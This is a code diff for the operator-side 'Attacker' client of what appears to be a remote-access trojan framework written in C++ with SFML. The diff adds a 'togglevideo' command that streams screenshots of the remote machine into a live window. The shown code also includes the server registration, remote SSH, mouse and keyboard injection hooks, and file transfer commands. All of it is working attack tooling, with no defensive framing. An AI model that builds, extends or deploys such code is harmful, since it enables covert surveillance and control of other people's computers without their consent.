@@ -2,7 +2,7 @@
 #include "../commands.hpp"
 #include <sstream>
 #include <fstream>
-#include <SFML/Window.hpp>
+#include <SFML/Graphics.hpp>
 
 Attacker* Attacker::attacker = nullptr;
 
@@ -86,7 +86,6 @@ int Attacker::update()
 
 	return 0;
 }
-
 void Attacker::receiveTcp()
 {
 	sf::Packet p;
@@ -101,9 +100,11 @@ void Attacker::receiveTcp()
 			isSshActive = false;
 			isSendingMouse = false;
 			isSendingKeyboard = false;
+			isGettingVideo = false;
 
 			tui.setIsSendingMouse(isSendingMouse);
 			tui.setIsSendingKeyboard(isSendingKeyboard);
+			tui.setIsGettingVideo(isGettingVideo);
 			tui.setClientsOutput("Server connection required");
 			tui.setDatabaseOutput("Server connection and admin privileges required");
 			tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
@@ -123,130 +124,6 @@ void Attacker::receiveTcp()
 		packetsToProcess.push_back(p);
 	else
 		responsesToProcess[reqId] = p;
-}
-
-void Attacker::connectServer(bool pw, std::string ipStr, short port)
-{
-	isInitialized = false;
-	isAdmin = false;
-
-	isSshActive = false;
-	isSendingMouse = false;
-	isSendingKeyboard = false;
-	server.disconnect();
-
-	tui.setIsSendingMouse(isSendingMouse);
-	tui.setIsSendingKeyboard(isSendingKeyboard);
-	tui.setClientsOutput("Server connection required");
-	tui.setDatabaseOutput("Server connection and admin privileges required");
-	tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
-	tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
-
-	//retrieve the ip and port from the interface string
-	//if no port is provided, default to 443
-	if (ipStr.find_first_of(':') != std::string::npos) {
-		auto pos = ipStr.find_first_of(':');
-		try {
-			port = std::stoi(ipStr.substr(pos + 1));
-		}
-		catch (const std::invalid_argument&) {
-			tui.printServerShell("port provided is not valid\n");
-			return;
-		}
-		ipStr = ipStr.substr(0, pos);
-	}
-
-	//parse the ip address
-	auto ip = sf::IpAddress::resolve(ipStr);
-	if (!ip.has_value()) {
-		tui.printServerShell("ip address provided is not valid\n");
-		return;
-	}
-	serverIp = ip.value();
-
-	//connect to the server
-	if (server.connect(serverIp, port) != sf::Socket::Status::Done) {
-		tui.printServerShell("failed to connect to server\n");
-		return;
-	}
-
-	//take password input from the user (if admin)
-	std::string password = "";
-	if (pw) {
-		tui.printServerShell("enter the password: ");
-		while (true) {
-			if (tui.server_commands.size() < 1) {
-				sf::sleep(sf::milliseconds(100));
-				continue;
-			}
-
-			password = tui.server_commands.front();
-			tui.server_commands.pop();
-			tui.printServerShell(std::string(password.size(), '*') + "\n");
-			break;
-		}
-	}
-
-	//send the registration request
-	sf::Packet req;
-	uint16_t reqId = requestId++;
-	auto cmd = (pw) ? Cmd::REGISTER_ADMIN : Cmd::REGISTER_ATTACKER;
-	req << reqId << std::uint8_t(cmd) << std::string("#v0.0.1#") << myHId;
-	if (pw)
-		req << password;
-	if (server.send(req) != sf::Socket::Status::Done) {
-		tui.printServerShell("failed to send registration request\n");
-
-		server.disconnect();
-		return;
-	}
-
-	//wait for initialization response and output progress
-	tui.printServerShell("waiting for response: [");
-	for (int i = 0; i < 10; i++) {
-		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-			sf::sleep(sf::milliseconds(500));
-			tui.printServerShell("*");
-		}
-		else
-			tui.printServerShell(".");
-	}
-	tui.printServerShell("] - ");
-
-	//initialization wasn't successful
-	if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-		tui.printServerShell("timed out\n");
-
-		server.disconnect();
-		return;
-	}
-	
-	sf::Packet res = responsesToProcess[reqId];
-	responsesToProcess.erase(reqId);
-
-	bool success = false;
-	res >> success;
-	if (!success) {
-		if (pw)
-			tui.printServerShell("failed admin login\n");
-		else
-			tui.printServerShell("you are banned :(\n");
-
-		server.disconnect();
-		return;
-	}
-
-	res >> myId;
-	isInitialized = true;
-	isAdmin = pw;
-
-	std::string add = server.getRemoteAddress().value().toString() + ":" + std::to_string(server.getRemotePort());
-	tui.setInfoTitle(ftxui::text("Connected to " + add) | ftxui::color(ftxui::Color::Green));
-
-	if (pw)
-		tui.printServerShell("admin access granted (" + std::to_string(myId) + ")\n");
-	else
-		tui.printServerShell("initialized (" + std::to_string(myId) + ")\n");
 }
 
 bool Attacker::handleCmd(const std::string& s)
@@ -528,6 +405,37 @@ bool Attacker::handleCmd(const std::string& s)
 			tui.setIsSendingKeyboard(isSendingKeyboard);
 		}
 	}
+	else if (cmd == "togglevideo") {
+		if (param.size() != 0) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+		else if (!isSshActive) {
+			tui.printServerShell("ssh must be active\n");
+			return true;
+		}
+
+		//stop video feed
+		if (isGettingVideo) {
+			isGettingVideo = false;
+			if (getVideoThread != nullptr) {
+				getVideoThread->join();
+				delete getVideoThread;
+				getVideoThread = nullptr;
+			}
+			else
+				tui.printServerShell("video thread already stopped\n");
+		}
+		//start video feed
+		else {
+			if (getVideoThread != nullptr)
+				getVideoThread->join();
+
+			isGettingVideo = true;
+			getVideoThread = new std::thread(&Attacker::handleVideo, this);
+		}
+		tui.setIsGettingVideo(isGettingVideo);
+	}
 	
 	else if (cmd == "sendfile") {
 		if (param.size() != 2) {
@@ -684,7 +592,7 @@ bool Attacker::handleCmd(const std::string& s)
 			else {
 				file.close();
 				std::remove(destFilePath.c_str());
-				tui.printServerShell("invalid source file path\n");
+				tui.printServerShell("invalid source file path (or empty file)\n");
 			}
 		}
 	}
@@ -708,7 +616,6 @@ bool Attacker::handleCmd(const std::string& s)
 
 	return true;
 }
-
 void Attacker::handlePacket(sf::Packet& p)
 {	
 	uint8_t cmd;
@@ -720,9 +627,11 @@ void Attacker::handlePacket(sf::Packet& p)
 		isSshActive = false;
 		isSendingMouse = false;
 		isSendingKeyboard = false;
+		isGettingVideo = false;
 
 		tui.setIsSendingMouse(isSendingMouse);
 		tui.setIsSendingKeyboard(isSendingKeyboard);
+		tui.setIsGettingVideo(isGettingVideo);
 		tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
 	}
 	else if (cmd == uint8_t(Cmd::SSH_DATA)) {
@@ -736,6 +645,130 @@ void Attacker::handlePacket(sf::Packet& p)
 	}
 }
 
+void Attacker::connectServer(bool pw, std::string ipStr, short port)
+{
+	isInitialized = false;
+	isAdmin = false;
+
+	isSshActive = false;
+	isGettingVideo = false;
+	isSendingMouse = false;
+	isSendingKeyboard = false;
+	server.disconnect();
+
+	tui.setIsSendingMouse(isSendingMouse);
+	tui.setIsSendingKeyboard(isSendingKeyboard);
+	tui.setClientsOutput("Server connection required");
+	tui.setDatabaseOutput("Server connection and admin privileges required");
+	tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
+	tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
+
+	//retrieve the ip and port from the interface string
+	//if no port is provided, default to 443
+	if (ipStr.find_first_of(':') != std::string::npos) {
+		auto pos = ipStr.find_first_of(':');
+		try {
+			port = std::stoi(ipStr.substr(pos + 1));
+		}
+		catch (const std::invalid_argument&) {
+			tui.printServerShell("port provided is not valid\n");
+			return;
+		}
+		ipStr = ipStr.substr(0, pos);
+	}
+
+	//parse the ip address
+	auto ip = sf::IpAddress::resolve(ipStr);
+	if (!ip.has_value()) {
+		tui.printServerShell("ip address provided is not valid\n");
+		return;
+	}
+	serverIp = ip.value();
+
+	//connect to the server
+	if (server.connect(serverIp, port) != sf::Socket::Status::Done) {
+		tui.printServerShell("failed to connect to server\n");
+		return;
+	}
+
+	//take password input from the user (if admin)
+	std::string password = "";
+	if (pw) {
+		tui.printServerShell("enter the password: ");
+		while (true) {
+			if (tui.server_commands.size() < 1) {
+				sf::sleep(sf::milliseconds(100));
+				continue;
+			}
+
+			password = tui.server_commands.front();
+			tui.server_commands.pop();
+			tui.printServerShell(std::string(password.size(), '*') + "\n");
+			break;
+		}
+	}
+
+	//send the registration request
+	sf::Packet req;
+	uint16_t reqId = requestId++;
+	auto cmd = (pw) ? Cmd::REGISTER_ADMIN : Cmd::REGISTER_ATTACKER;
+	req << reqId << std::uint8_t(cmd) << std::string("#" PROGRAM_VERSION "#") << myHId;
+	if (pw)
+		req << password;
+	if (server.send(req) != sf::Socket::Status::Done) {
+		tui.printServerShell("failed to send registration request\n");
+
+		server.disconnect();
+		return;
+	}
+
+	//wait for initialization response and output progress
+	tui.printServerShell("waiting for response: [");
+	for (int i = 0; i < 10; i++) {
+		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+			sf::sleep(sf::milliseconds(500));
+			tui.printServerShell("*");
+		}
+		else
+			tui.printServerShell(".");
+	}
+	tui.printServerShell("] - ");
+
+	//initialization wasn't successful
+	if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+		tui.printServerShell("timed out\n");
+
+		server.disconnect();
+		return;
+	}
+
+	sf::Packet res = responsesToProcess[reqId];
+	responsesToProcess.erase(reqId);
+
+	bool success = false;
+	res >> success;
+	if (!success) {
+		if (pw)
+			tui.printServerShell("failed admin login\n");
+		else
+			tui.printServerShell("you are banned :(\n");
+
+		server.disconnect();
+		return;
+	}
+
+	res >> myId;
+	isInitialized = true;
+	isAdmin = pw;
+
+	std::string add = server.getRemoteAddress().value().toString() + ":" + std::to_string(server.getRemotePort());
+	tui.setInfoTitle(ftxui::text("Connected to " + add) | ftxui::color(ftxui::Color::Green));
+
+	if (pw)
+		tui.printServerShell("admin access granted (" + std::to_string(myId) + ")\n");
+	else
+		tui.printServerShell("initialized (" + std::to_string(myId) + ")\n");
+}
 void Attacker::updateList(sf::Packet& p)
 {
 	uint16_t dbSize, clientsSize;
@@ -829,7 +862,6 @@ void Attacker::sendFile(std::string path, uint32_t numPackets) {
 	isSendingFile = false;
 	stopSendingFile = false;
 }
-
 void Attacker::getFile(std::string path, std::string ext, uint32_t numPackets)
 {
 	tui.setGettingFileProgress(0);
@@ -883,6 +915,76 @@ void Attacker::getFile(std::string path, std::string ext, uint32_t numPackets)
 
 	isGettingFile = false;
 	stopGettingFile = false;
+}
+
+void Attacker::handleVideo()
+{
+	sf::RenderWindow w(sf::VideoMode({ 640, 360 }), "Video Feed", sf::Style::Default);
+	int failedFrames = 0;
+
+	while (w.isOpen() && isGettingVideo && (failedFrames < 5)) {
+		while (const std::optional event = w.pollEvent()) {
+			if (event->is<sf::Event::Closed>())
+				isGettingVideo = false;
+			else if (const auto* k = event->getIf<sf::Event::KeyPressed>()) {
+				//toggle fullscreen
+				if (k->code == sf::Keyboard::Key::Enter && k->alt) {
+					if (w.getSize() != sf::VideoMode::getDesktopMode().size)
+						w.create(sf::VideoMode::getDesktopMode(), "Video Feed", sf::State::Fullscreen);
+					else
+						w.create(sf::VideoMode({ 640, 360 }), "Video Feed", sf::Style::Default);
+				}
+			}
+		}
+
+		sf::Packet req;
+		uint16_t reqId = requestId++;
+		req << reqId << uint8_t(Cmd::SSH_REQUEST_SCREENSHOT);
+		if (server.send(req) != sf::Socket::Status::Done) {
+			failedFrames++;
+			continue;
+		}
+
+		//wait up to 3 seconds for the next frame to be received
+		for (int i = 0; i < 60; i++) {
+			if (responsesToProcess.find(reqId) != responsesToProcess.end() || !isGettingVideo)
+				break;
+			sf::sleep(sf::milliseconds(50));
+		}
+		//timeout or error
+		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+			failedFrames++;
+			continue;
+		}
+
+		sf::Packet p = responsesToProcess[reqId];
+		responsesToProcess.erase(reqId);
+		const void* buffer = p.getData();
+		auto data = static_cast<const char*>(buffer);
+		data += 3;
+		sf::Texture texture;
+		if (!texture.loadFromMemory(data, p.getDataSize() - 3))
+			break;
+
+		sf::Sprite sprite(texture);
+		sprite.setScale( {
+			float(w.getSize().x) / float(texture.getSize().x),
+			float(w.getSize().y) / float(texture.getSize().y)
+		});
+
+		w.clear();
+		w.setView(sf::View(sf::FloatRect(sf::Vector2f(0, 0), sf::Vector2f(w.getSize()))));
+		w.draw(sprite);
+		w.display();
+
+		failedFrames = 0;
+	}
+
+	if (failedFrames >= 5)
+		tui.printServerShell("video feed failed\n");
+
+	isGettingVideo = false;
+	tui.setIsGettingVideo(isGettingVideo);
 }
 
 LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -948,7 +1050,7 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 			break;
 		}
 		case WM_MOUSEMOVE: {
-			if (attacker->mouseTimer.getElapsedTime().asMilliseconds() < 65)
+			if (attacker->mouseTimer.getElapsedTime().asMilliseconds() < 100)
 				break;
 
 			auto size = sf::Vector2f(sf::VideoMode::getDesktopMode().size);
@@ -968,7 +1070,6 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-
 LRESULT CALLBACK Attacker::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode == HC_ACTION && attacker->isSendingKeyboard &&
